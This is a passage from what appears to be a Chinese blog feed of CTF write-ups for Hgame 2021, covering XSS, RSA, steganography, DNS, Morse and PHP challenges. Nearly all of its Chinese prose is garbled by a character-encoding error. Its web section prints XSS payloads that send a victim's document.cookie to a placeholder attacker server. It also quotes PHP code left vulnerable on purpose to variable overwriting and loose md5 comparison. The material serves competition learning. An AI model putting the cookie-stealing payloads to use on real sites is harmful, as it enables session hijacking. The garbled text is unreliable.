æ¥å¾—åˆ°å°–æ‹¬å·ã€‚</p><p>å•å¼•å·è¿˜æ˜¯èƒ½ç”¨çš„ï¼Œå˜¿å˜¿ã€‚</p><p><strong>payload:</strong> </p><pre class="language-none"><code class="language-none">(.)iframe src=.preview.(.)|$1img src=x onerror=top.location='//VPSIP/'+document.cookie$2</code></pre><p>ç„¶åæ‹¿åˆ° cookie</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224015157203.png"></p><pre class="language-none"><code class="language-none">token=6a506f5c3eff9ffe9dc573bc93629038f61a7fcdd7662efb441451b08b0c6671</code></pre><p>æ‹¿åˆ° flag</p><p><code>hgame{CSP_iS_VerY_5trlct&amp;0nly_C@n_uSe_3vil.Js!}</code></p><p>BTW, å®˜æ–¹ç»™çš„ payload æ˜¯</p><blockquote><p>åˆ©â½¤æˆ‘ä»¬ post çš„ iframe ä¸¤è¾¹çš„å°–æ‹¬å·ï¼Œé€šè¿‡ <code>$` $'</code> â½†ä¸­â½£æœ‰</p></blockquote><pre class="language-none"><code class="language-none">iframe|$`input size=11 onfocus=window.open('vps-ip'+document.cookie)autofocus$'</code></pre><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LikiPrime"><a href="#LikiPrime" class="headerlink" title="LikiPrime"></a>LikiPrime</h3><blockquote><p>Wow! RSA!</p><p><a href="https://prime.liki.link/">https://prime.liki.link/</a> </p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> random<span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n<span class="token keyword">from</span> secret <span class="token keyword">import</span> secrets<span class="token punctuation">,</span> flag<span class="token keyword">def</span> <span class="token function">get_prime</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>    prime <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>        prime <span class="token operator">=</span> prime <span class="token operator">&lt;&lt;</span> <span class="token number">1</span>    <span class="token keyword">return</span> prime <span class="token operator">-</span> <span class="token number">1</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>secrets<span class="token punctuation">)</span>m <span class="token operator">=</span> s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>p <span class="token operator">=</span> get_prime<span class="token punctuation">(</span>secrets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>q <span class="token operator">=</span> get_prime<span class="token punctuation">(</span>secrets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">0x10001</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n = {}.format(n)"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e = {}.format(e)"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c = {}.format(c)"</span><span class="token punctuation">)</span><span class="token comment"># n = 15361898878235696574667000105109009720717806584760935092206242960407549236363501417213696346370999607974104247856479458833772412536980365740161717369268547876567930581662460946856562030722330783421995955447378594119758550329759849393535018344139103042143621239011469955648205934903904045564846822159998174879695774419450399723970148270141003002902927002767984254099972288746243481084381643719731958360702561818663569730597624966561268824737610893516032068613120089855690580047620589196079907477458543783300282393495461746306096415443274084362956267239186823089349090398919748814938872938478097065267156231648487203329412422615711711886164634059723362167236118521458497248305115764510762731915291882155494011713295462603221439763218477455674584662524137991730891776826849188975650354165106378834014987695592746836998002232826678339919918799781246827459617082687425955430641815518416878015728514477287192934193957833532996687234554280263817068106805440848475668830505180172049674756979856286907198648267160926305328986853052888831678087029867946180609</span><span class="token comment"># e = 65537</span><span class="token comment"># c = 7927187628026055322783940901550651937893953660065534609714001711924456963095603013667085470146144874981960574233466397443449977149997357471575431695025415526421127927424585253533999961265066779103259623451208111709082292139347059312149137665426462381816329178229484680275368657450003046701355985014009700915439417466826446848877329284810802949440433122207430136944380576095681081740197798597559437163702511712448892986978229285577672410865991889634686024629071902793778620692548548234276678653195648305462703623579369309956481606223043040903082180559720551235515700080661234190693094571406679557502413049745325301747588707839920522910923018864009003988475371258742969932381590308381543035539043149634871622927695645953044249331889058081699783884965964986919852075768119185486506729958481688848547730131040350180411446263394686119546781350542737049112800140601734883325024073000156078427592350484379976615561586860882656403198952361411599125358422676828954908797542225611418969233985502900316342896903161811894061826308302594273209131132802270416006</span></code></pre><p>p, q éƒ½æ˜¯ 2**n - 1ï¼Œæ‡’äº†ç›´æ¥å» <a href="http://factordb.com/">http://factordb.com</a> æ±‚è§£ï¼Œå¾—åˆ°</p><pre class="language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">1279</span> <span class="token operator">-</span> <span class="token number">1</span>q <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">2203</span> <span class="token operator">-</span> <span class="token number">1</span></code></pre><p>ç„¶åç›´æ¥è§£å°±å¥½ã€‚</p><p><code>hgame{Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!}</code></p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å™¢ï¼ŒMisc å¿˜è®°åšäº†å•Šï¼Œé—®é¢˜ä¸å¤§ï¼ˆï¼ˆ</p><p>å–µå‘œå‘œï¼Œæˆ‘å¥½èœå•Šï¼Œé¢˜ç›®å¥½éš¾å•Šï¼ï¼ï¼</p><p>å°±è¿™æ ·å§ï¼ˆ</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p><!--### HappyNewYear!!> Liki çš„æœ‹å‹ä»¬åœ¨æ–°å¹´çš„æ—¶å€™ç»™å¥¹å‘é€äº†æ–°å¹´ç¥ç¦ > å¥½å®¶ä¼™ï¼Œä¸€çœ‹å°±æ˜¯ç¾¤å‘çš„ï¼Œæœ‰å‡ ä¸ªæœ‹å‹å‘é€çš„å†…å®¹è¿˜æ˜¯ç›¸åŒçš„ï¼>> https://1.oss.hgame2021.vidar.club/happynewyear_task_1e883107c8b6f99f7c0199872ba958a1.zip -->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 Hgame Week2 WriteUp</title>
      <link href="2021/02/15/CTF_2021HgameWeek2/"/>
      <url>2021/02/15/CTF_2021HgameWeek2/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å¼€é—¨è§å±±ï¼Œè¿™ç¯‡æ˜¯ Hgame 2021 ç¬¬äºŒå‘¨çš„ WriteUp å•¦ã€‚</p><p>ç¬¬ä¸€å‘¨çš„è¯¦è§ <a href="https://miaotony.xyz/2021/02/07/CTF_2021HgameWeek1/">CTF | 2021 Hgame Week1 WriteUp</a>ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><blockquote><p>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚</p><p><a href="https://1.oss.hgame2021.vidar.club/tools_21d9ccfca5a4321d6256038d3e885b6d.zip">https://1.oss.hgame2021.vidar.club/tools_21d9ccfca5a4321d6256038d3e885b6d.zip</a> </p></blockquote><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206201322285.png"></p><p>F5 è§£ <code>Matryoshka.jpg</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ java Extract Matryoshka.jpg -p <span class="token string">"!LyJJ9bi&amp;M7E72*JyD"</span>Huffman decoding startsPermutation starts<span class="token number">577536</span> indices shuffledExtraction startsLength of embedded file: <span class="token number">18</span> bytes<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token number">127</span>, <span class="token number">7</span><span class="token punctuation">)</span> code used</code></pre><p>å¾—åˆ° <code>e@317S*p1A4bIYIs1M</code></p><p>è§£å‹</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206201353990.png"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># A7SL9nHRJXLh@$EbE8</span>$ steghide.exe extract -sf <span class="token string">"01.jpg"</span> -p <span class="token string">"A7SL9nHRJXLh@<span class="token variable">$EbE8</span>"</span>wrote extracted data to <span class="token string">"pwd.txt"</span><span class="token builtin class-name">.</span></code></pre><p><code>u0!FO4JUhl5!L55%$&amp;</code></p><p>02.jpg:<code>z0GFieYAee%gdf0%lF</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ outguess -k <span class="token string">"z0GFieYAee%gdf0%lF"</span> -r 02.jpg output.txt Reading 02.jpg<span class="token punctuation">..</span><span class="token punctuation">..</span>Extracting usable bits:   <span class="token number">4930</span> bitsSteg retrieve: seed: <span class="token number">184</span>, len: <span class="token number">18</span>$ <span class="token function">cat</span> output.txt @UjXL93044V5zl2ZKI</code></pre><p>æœ‰æ¯’ï¼Œæˆ‘ç”¨æ–°ç‰ˆ <a href="https://github.com/resurrecting-open-source-projects/outguess">https://github.com/resurrecting-open-source-projects/outguess</a> è¿™ä¸ªå‡ºæ¥æ˜¯ä¹±ç â€¦â€¦</p><p>è¦ç”¨æ—§ç‰ˆçš„ <a href="https://github.com/crorvick/outguess%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E3%80%82">https://github.com/crorvick/outguessï¼Œç„¶åç¼–è¯‘å®‰è£…ã€‚</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span></code></pre><p>03.jpg: <code>rFQmRoT5lze@4X4^@0</code></p><p>åˆ°è¿™é‡Œå…¶å®å°±å¯ä»¥æ‰«å‡ºæ¥äº†~</p><p><code>hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</code></p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206210455328.png"></p><p>ä¸è¿‡è¿˜æ˜¯åšä¸€ä¸‹å§ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206211149342.png" alt="jphs"></p><p><code>xSRejK1^Z1Cp9M!z@H</code></p><p>æœ€åæ‹¼æˆä¸€æ•´ä¸ªã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/all.png" alt="all"></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><blockquote><p>A significant invention.</p><p><a href="https://1.oss.hgame2021.vidar.club/dns_250e1c3c63209fd5546937be4f41cb39.pcapng">https://1.oss.hgame2021.vidar.club/dns_250e1c3c63209fd5546937be4f41cb39.pcapng</a> </p></blockquote><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207012834196.png" alt="æµé‡åŒ…"></p><p>ä»æŠ“åˆ°çš„æµé‡å¯ä»¥çœ‹åˆ° DNS æŸ¥è¯¢ï¼Œä»¥åŠè®¿é—®äº†ä¸€ä¸ªåŸŸåä¸º flag.hgame2021.cf çš„ç½‘ç«™ã€‚</p><p>BTW, è¿™æ˜¯ä¸ªå…è´¹åŸŸåï¼Œå¥—äº† CloudFlareã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207013044058.png"></p><p>è®¿é—®æç¤º <code>Do you know SPF?</code>ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207012654098.png"></p><blockquote><p><strong>å‘ä»¶äººç­–ç•¥æ¡†æ¶</strong>ï¼ˆè‹±è¯­ï¼š<strong>Sender Policy Framework</strong>ï¼›ç®€ç§°<strong>SPF</strong>ï¼› <a href="https://tools.ietf.org/html/rfc4408">RFC 4408</a>ï¼‰æ˜¯ä¸€å¥—<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">ç”µå­é‚®ä»¶</a>è®¤è¯æœºåˆ¶ï¼Œå¯ä»¥ç¡®è®¤ç”µå­é‚®ä»¶ç¡®å®æ˜¯ç”±ç½‘åŸŸæˆæƒçš„é‚®ä»¶æœåŠ¡å™¨å¯„å‡ºï¼Œé˜²æ­¢æœ‰äººä¼ªå†’èº«ä»½<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E9%87%A3%E9%AD%9A">ç½‘ç»œé’“é±¼</a>æˆ–å¯„å‡º<a href="https://zh.wikipedia.org/wiki/%E5%9E%83%E5%9C%BE%E9%9B%BB%E9%83%B5">åƒåœ¾ç”µé‚®</a>ã€‚SPFå…è®¸ç®¡ç†å‘˜è®¾å®šä¸€ä¸ª<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">DNS</a> <a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8B%99%E5%99%A8%E8%A8%98%E9%8C%84%E9%A1%9E%E5%9E%8B%E5%88%97%E8%A1%A8">TXTè®°å½•</a>æˆ–<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8B%99%E5%99%A8%E8%A8%98%E9%8C%84%E9%A1%9E%E5%9E%8B%E5%88%97%E8%A1%A8">SPFè®°å½•</a>è®¾å®šå‘é€é‚®ä»¶æœåŠ¡å™¨çš„IPèŒƒå›´ï¼Œå¦‚æœ‰ä»»ä½•é‚®ä»¶å¹¶éä»ä¸Šè¿°æŒ‡æ˜æˆæƒçš„IPåœ°å€å¯„å‡ºï¼Œåˆ™å¾ˆå¯èƒ½è¯¥é‚®ä»¶å¹¶éç¡®å®ç”±çœŸæ­£çš„å¯„ä»¶è€…å¯„å‡ºï¼ˆé‚®ä»¶ä¸Šå£°ç§°çš„â€œå¯„ä»¶è€…â€ä¸ºå‡å†’ï¼‰ã€‚</p><p><em><a href="https://zh.wikipedia.org/wiki/%E5%8F%91%E4%BB%B6%E4%BA%BA%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6">Via wikipedia</a> (<a href="https://en.wikipedia.org/wiki/Sender_Policy_Framework">English version</a>)</em></p></blockquote><p>é…åŸŸåé‚®ç®±çš„æ—¶å€™å°±æ•´è¿‡ï¼Œä¸€èˆ¬æ˜¯éœ€è¦è®¾ä¸ª TXT è®°å½•ã€‚</p><p>é‚£å°± dig çœ‹çœ‹å§ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207014103162.png" alt="flag"></p><p><code>hgame{D0main_N4me_5ystem}</code></p><p>ï¼ˆå˜¿å˜¿ï¼Œè€å¥—è·¯äº†</p><h3 id="Telegraphï¼š1601-6639-3459-3134-0892"><a href="#Telegraphï¼š1601-6639-3459-3134-0892" class="headerlink" title="Telegraphï¼š1601 6639 3459 3134 0892"></a>Telegraphï¼š1601 6639 3459 3134 0892</h3><blockquote><p>ä»–æ›¾ç»æœ€å–œæ¬¢çš„æ›²å¸ˆå†™çš„æ›²å­ï¼Œè®©äººçŠ¹å¦‚æ¼«æ­¥åœ¨æ˜Ÿç©ºä¹‹ä¸‹ï¼Œå¯å¦‚ä»Šä»–å¬è§åªè§‰å¾—åèƒƒã€‚<br>ç”±äºæ–‡ä»¶åè¿‡é•¿ï¼Œå•ç‹¬ç»™å‡ºé™„ä»¶çš„md5: E5C3EE3F441B860B07A3ADCD98BFFC00<br><strong>è¯·å°†flagä»¥hgame{your_flag_here}å½¢å¼æäº¤ï¼Œflagä¸ºå…¨å¤§å†™ã€‚</strong></p><p>[<a href="https://1.oss.hgame2021.vidar.club/Telegraph%EF%BC%9A1601%206639%203459%203134%200892.mp3]">https://1.oss.hgame2021.vidar.club/Telegraph%EF%BC%9A1601%206639%203459%203134%200892.mp3]</a>(<a href="https://1.oss.hgame2021.vidar.club/Telegraph%EF%BC%9A1601">https://1.oss.hgame2021.vidar.club/Telegraphï¼š1601</a> 6639 3459 3134 0892.mp3) </p></blockquote><p>ç”µæŠ¥ 1601 6639 3459 3134 0892</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207022747021.png" alt="ç”µæŠ¥è§£ç "></p><p><a href="https://www.qqxiuzi.cn/bianma/dianbao.php">è§£ç </a>å¾—åˆ° <code>å¸¦é€šæ»¤æ³¢å™¨</code>ï¼Œå–µï¼ŒBPF å¥½ä¸œè¥¿ã€‚</p><p>æ‹–è¿› Audacityï¼Œé¢‘è°±å›¾çœ‹åˆ°æ˜æ˜¾çš„ 850Hz å­—æ ·ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207023011334.png" alt="850Hz"></p><p>åœ¨ 850Hz èŒƒå›´ä¸Šä¸‹è®¾ç½®å¸¦é€šæ»¤æ³¢å™¨åï¼Œåœ¨ 1:10 - 1:35 ä¹‹å‰å¬åˆ°äº†ç”µæŠ¥å£°éŸ³ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207024312712.png" alt="ç”µæŠ¥"></p><p>å…¶å®å¯¹æ¯”ä¸€ä¸‹ä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207024542264.png"></p><p>æ‰‹å·¥æŠ„å½•ä¸€ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</code></pre><p>è§£å¯†å¾—åˆ°</p><pre class="language-none"><code class="language-none">YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI</code></pre><p><code>hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</code></p><h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><blockquote><p>â€œæˆ‘ä»¬ä¸ä»…å¼„é”™äº†ä»–çš„ä¸Šä¸‹ï¼Œè¿˜é¢ å€’äº†å®ƒçš„å·¦å³ã€‚â€</p><p><a href="https://1.oss.hgame2021.vidar.club/Hallucigenia_6aa99427e137e9e3563d83f5d639cc74.png">https://1.oss.hgame2021.vidar.club/Hallucigenia_6aa99427e137e9e3563d83f5d639cc74.png</a> </p></blockquote><p>å›¾ç‰‡ç¬¬0å±‚é‡Œéšå†™äº†äºŒç»´ç </p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207030024958.png"></p><p>æ‰«ç å¾—åˆ° </p><pre class="language-none"><code class="language-none">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=</code></pre><p>base64 è§£ç å‘ç°æ˜¯å€’ç€çš„ png</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207030250744.png"></p><p>ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™å¼ å›¾</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/1.png" alt="1"></p><p>ä¸Šä¸‹ï¼ˆå‚ç›´ï¼‰å€’ä¸€ä¸‹ï¼Œå¾—åˆ° flagã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/2.png" alt="2"></p><p><code>hgame{tenchi_souzou_dezain_bu}</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h3><p><a href="http://www.zip/">www.zip</a> ç»™äº†æºç ã€‚</p><p>å‘ç°å…¶å®å°±åªæœ‰6ä¸ªæœ‰ç”¨æ–‡ä»¶ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207175711624.png"></p><p><code>config.ini</code> æ˜¯ç”¨æˆ·é…ç½®ï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„ testuser å¯†ç  md5 æ˜¯ 0e å¼€å¤´ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token selector">[global]</span><span class="token constant">debug</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token selector">[admin]</span><span class="token constant">username</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">pass_md5</span> <span class="token attr-value"><span class="token punctuation">=</span> b02d455009d3cf71951ba28058b2e615</span><span class="token selector">[testuser]</span><span class="token constant">username</span> <span class="token attr-value"><span class="token punctuation">=</span> testuser</span><span class="token constant">pass_md5</span> <span class="token attr-value"><span class="token punctuation">=</span> 0e114902927253523756713132279690</span></code></pre><p><code>Config.php</code> è¯»å–ä¸Šé¢çš„é…ç½®æ–‡ä»¶ï¼Œå¯¼å…¥æ‰€æœ‰ç”¨æˆ·ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword type-declaration">array</span> <span class="token variable">$conf</span><span class="token punctuation">;</span>    <span class="token comment">/**     * @var array|false     */</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$conf</span> <span class="token operator">=</span> <span class="token function">parse_ini_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.ini'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getItem</span><span class="token punctuation">(</span><span class="token variable">$section</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$conf</span><span class="token punctuation">[</span><span class="token variable">$section</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>    <span class="token punctuation">{</span>        <span class="token variable">$users</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$conf</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$users</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'global'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$users</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token class-name static-context">Config</span><span class="token operator">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><code>lazy.php</code> è¿™é‡ŒæŠŠæ‰€æœ‰ GET / POST è¿›æ¥çš„æ•°æ®éƒ½ç›´æ¥èµ‹å€¼äº†ï¼Œæ˜¯æ¼æ´ç‚¹ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"SESSION"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"SEVER"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"COOKIE"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"GLOBALS"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_GET'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'_POST'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$_request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$$_request</span> <span class="token keyword">as</span> <span class="token variable">$_k</span> <span class="token operator">=&gt;</span> <span class="token variable">$_v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filter</span> <span class="token keyword">as</span> <span class="token variable">$youBadBad</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_k</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$youBadBad</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$</span><span class="token punctuation">{</span><span class="token variable">$_k</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">$_v</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// è‡ªåŠ¨åŠ è½½ç±»ï¼Œè¿™æ ·æˆ‘ä¹Ÿèƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~</span><span class="token keyword">function</span> <span class="token function">auto</span><span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require_once</span> <span class="token variable">$class_name</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'auto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><code>User.php</code> å®šä¹‰ User ç±»</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">session_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$userList</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getUsersList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$userList</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$userList</span><span class="token punctuation">[</span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass_md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token constant 